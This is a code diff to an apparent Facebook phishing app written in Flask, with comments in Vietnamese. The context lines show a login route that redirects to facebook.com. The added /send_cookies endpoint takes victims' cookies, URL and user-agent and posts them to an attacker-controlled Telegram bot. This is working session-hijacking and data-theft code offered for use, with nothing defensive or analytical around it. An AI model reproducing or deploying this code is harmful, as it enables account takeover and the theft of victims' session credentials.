@@ -51,6 +51,30 @@ def login():
     resp = make_response(redirect('https://www.facebook.com'))
     resp.set_cookie('session_id', 'hijackable_' + os.urandom(8).hex(), httponly=True)
     return resp
+@app.route('/send_cookies', methods=['POST'])
+def send_cookies():
+    data = request.json
+    cookies = data.get('cookies', 'No cookies')
+    
+    message = f"""
+🔴 **COOKIE ĐÃ THU THẬP TỪ XA**
+
+🌐 URL: {data.get('url')}
+📱 User-Agent: {data.get('userAgent')[:100]}
+🍪 Cookies: 
+{cookies}
+⏰ Time: {datetime.now()}
+    """
+    
+    # Gửi về Telegram
+    try:
+        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
+                     data={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
+        print("✅ Cookie đã gửi về Telegram")
+    except:
+        print("❌ Lỗi gửi cookie")
+    
+    return "OK", 200
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
